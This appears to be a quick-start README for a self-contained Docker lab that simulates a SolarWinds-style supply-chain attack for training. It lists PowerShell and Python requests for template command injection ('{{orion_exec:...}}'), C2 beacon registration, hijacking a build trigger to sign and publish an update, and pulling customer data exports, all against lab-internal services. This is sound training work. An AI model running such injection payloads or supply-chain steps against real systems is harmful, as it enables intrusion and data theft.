# Orion Echo Demo Quick Start

This is the one-person Docker Compose demo for the SolarWinds-inspired Orion
Echo supply-chain training scenario.

## Start

```powershell
docker compose up --build -d
```

Open:

```text
http://localhost:8080
```

Only `edge-proxy` publishes a host port. Internal services live on segmented
Compose networks.

## Main Demo Path

1. Recon:

```text
GET http://localhost:8080/
GET http://localhost:8080/docs/
GET http://localhost:8080/docs/releases/public
GET http://localhost:8080/service/build-info
```

2. Initial access through lab-controlled support preview:

```powershell
Invoke-RestMethod http://localhost:8080/support/preview `
  -Method Post `
  -ContentType 'application/json' `
  -Body '{"body":"{{orion_exec:cat /var/lib/support-portal/.post_exploit_marker}}"}'
```

3. Foothold orientation:

```powershell
Invoke-RestMethod http://localhost:8080/support/preview -Method Post -ContentType 'application/json' -Body '{"body":"{{orion_exec:id}}"}'
Invoke-RestMethod http://localhost:8080/support/preview -Method Post -ContentType 'application/json' -Body '{"body":"{{orion_exec:hostname}}"}'
Invoke-RestMethod http://localhost:8080/support/preview -Method Post -ContentType 'application/json' -Body '{"body":"{{orion_exec:ls /opt/support-portal}}"}'
Invoke-RestMethod http://localhost:8080/support/preview -Method Post -ContentType 'application/json' -Body '{"body":"{{orion_exec:cat /tmp/orion_stage2.txt}}"}'
```

4. Internal services are not exposed through the edge proxy. For instructor
walkthrough, execute requests from inside the Compose network:

```powershell
@'
import httpx
print(httpx.post('http://c2-emulator:8000/beacon/register', json={
  'host':'support-portal',
  'reachable_targets':['wiki','ticket-service','source-repo','build-server','update-server','customer-api']
}).json())
print(httpx.get('http://c2-emulator:8000/discover/services').json())
print(httpx.get('http://wiki:8000/pages/release/runbook-build-trigger').json())
print(httpx.get('http://ticket-service:8000/tickets/OES-1287').json())
print(httpx.get('http://source-repo:8000/files/release-pipeline/release.json').json())
'@ | docker compose exec -T support-portal python -
```

5. Build, sign, and publish:

```powershell
@'
import httpx
token = 'build-trigger-demo-7f3a91'
print(httpx.post('http://build-server:8000/api/jobs', json={
  'repo':'orionecho/echo-agent',
  'ref':'refs/heads/release/2.6.4',
  'channel':'anrc',
  'trigger_token': token
}).json())
print(httpx.get('http://build-server:8000/demo/sign-and-publish').json())
'@ | docker compose exec -T support-portal python -
```

6. Customer app applies the update and final collection:

```powershell
@'
import httpx
print(httpx.post('http://customer-app:8000/api/poll-now').json())
print(httpx.get('http://customer-api:8000/metadata').json())
print(httpx.get('http://customer-api:8000/facilities').json())
print(httpx.get('http://customer-api:8000/audits').json())
print(httpx.get('http://customer-api:8000/exports').json())
detail = httpx.get('http://customer-api:8000/exports/exp-2026-Q2-007').json()
print(detail)
print(httpx.get(detail['presigned_url']).text)
'@ | docker compose exec -T support-portal python -
```

7. Review ATT&CK-tagged logs:

```powershell
@'
import httpx, json
events = httpx.get('http://audit-log:8000/events').json()
print(json.dumps(events, indent=2))
'@ | docker compose exec -T support-portal python -
```

## Safety Notes

- The support portal does not expose arbitrary shell execution.
- The C2 service is a closed-action emulator.
- The update artifact is a benign tarball with a marker file.
- The object-store is a FastAPI demo service, not a real cloud account.
- No service mounts the Docker socket or runs privileged.
